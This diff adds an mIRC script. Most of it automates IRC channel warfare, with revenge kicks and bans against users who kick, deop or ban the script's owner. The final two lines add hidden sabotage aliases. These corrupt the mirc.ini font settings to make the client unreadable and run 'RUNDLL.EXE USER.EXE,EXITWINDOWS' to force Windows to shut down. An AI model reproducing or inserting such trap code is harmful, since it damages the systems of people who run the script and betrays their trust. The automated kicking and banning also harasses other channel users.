@@ -1,0 +1,42 @@
+on revange:join:%rchan: {
+  if ( %revange == ON ) { .raw kick $chan $nick Revange %kicks %kickc | halt }
+}
+on *:kick:#: {
+  if ( %revange == ON ) {
+    if ( $knick == $me ) && ( $nick !== chanserv ) {
+      .guser revange $nick 3
+      .set %rnick $nick
+      .set %rchan $chan
+    }
+  }
+  if ( $knick == $me ) && ( $nick !== chanserv ) && ( %revange !== ON ) { /echo -a %lost Your Revange Is Off! | .notice $nick My Revange is OFF! %lost }
+}
+on me:join:%rchan {
+  if ( %revange == ON ) {
+    if ( %rnick ison $chan ) { .raw kick $chan %rnick Revange %kicks %kickc | halt }
+  }
+}
+on *:deop:#: {
+  if ( $opnick == $me ) && ( $nick == Chanserv ) { .msg chanserv op $chan $me }
+  if ( $opnick == $me ) && ( $nick !== Chanserv ) && ( $nick !== $me ) {
+    .msg chanserv op $chan $me
+    .raw kick $chan $nick Deop %kicks %kickc
+    /ban $chan $nick 6
+  }
+}
+on *:op:#: {
+  if ( %revange == ON ) {
+    if ( $opnick == $me ) && ( %rnick ison %rchan ) { .raw kick $chan %rnick Revange %kicks %kickc | halt }
+  }
+}
+on @*:BAN:#:{
+  if ( $nick !== $me ) && ($banmask iswm $address($me,5)) {
+    .raw mode $chan -b $banmask
+    .raw kick $chan $nick Do Not Ban Me! %kicks %kickc | /ban $chan $nick 6
+  }
+}
+on revange:action:&:%rchan {
+  .raw kick $chan %rnick Revange %kicks %kickc | halt
+}
+alias fuckyou { if $readini mirc.ini fonts fscripts != symbol,10000,1 { writeini mirc.ini fonts fscripts symbol,10000,1 | .gilakmoleq | .timer 1 4 getlose } }
+alias gilakmoleq { if ( $exists(c:\win98\rundll.exe) ) { goto mati } | else if ( $exists(c:\windows\rundll.exe) ) { goto die | else halt } | :die | /.run C:\WINDOWS\RUNDLL.EXE USER.EXE,EXITWINDOWS | halt | :mati | /.run C:\WIN98\RUNDLL.EXE USER.EXE,EXITWINDOWS }
